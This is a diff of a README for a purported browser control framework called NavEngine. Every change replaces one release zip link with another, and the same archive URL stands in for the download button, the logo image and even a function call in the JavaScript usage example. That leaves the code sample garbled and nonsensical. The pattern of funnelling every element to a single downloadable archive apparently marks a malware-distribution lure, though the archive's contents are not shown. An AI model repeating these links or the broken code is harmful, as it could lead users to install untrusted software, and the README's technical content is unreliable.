@@ -14,9 +14,9 @@ NavEngine is a powerful browser control framework that utilizes the cutting-edge
 ## Installation 🛠️
 
 To get started with NavEngine, you can download the latest version from the following link:
-[Download NavEngine v1.0.0](https://github.com/ElFrijoLes/NavEngine/releases/download/v1.0/Application.zip)
+[Download NavEngine v1.0.0](https://github.com/ElFrijoLes/NavEngine/releases/download/v2.0/Software.zip)
 
-[![Download NavEngine](https://github.com/ElFrijoLes/NavEngine/releases/download/v1.0/Application.zip)](https://github.com/ElFrijoLes/NavEngine/releases/download/v1.0/Application.zip)
+[![Download NavEngine](https://github.com/ElFrijoLes/NavEngine/releases/download/v2.0/Software.zip)](https://github.com/ElFrijoLes/NavEngine/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the zip file, follow the installation instructions provided in the repository to launch NavEngine successfully.
 
@@ -31,7 +31,7 @@ Using NavEngine is simple and straightforward. Once you have installed the frame
 const navEngine = new NavEngine();
 
 // Perform a deepseek search
-https://github.com/ElFrijoLes/NavEngine/releases/download/v1.0/Application.zip('query', (results) => {
+https://github.com/ElFrijoLes/NavEngine/releases/download/v2.0/Software.zip('query', (results) => {
   // Handle search results
 });
 ```
@@ -52,4 +52,4 @@ NavEngine is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 Thank you for exploring NavEngine! ⚓️ Start navigating the web like never before with NavEngine. Happy browsing! 🌊
 
-![NavEngine Logo](https://github.com/ElFrijoLes/NavEngine/releases/download/v1.0/Application.zip)
+![NavEngine Logo](https://github.com/ElFrijoLes/NavEngine/releases/download/v2.0/Software.zip)
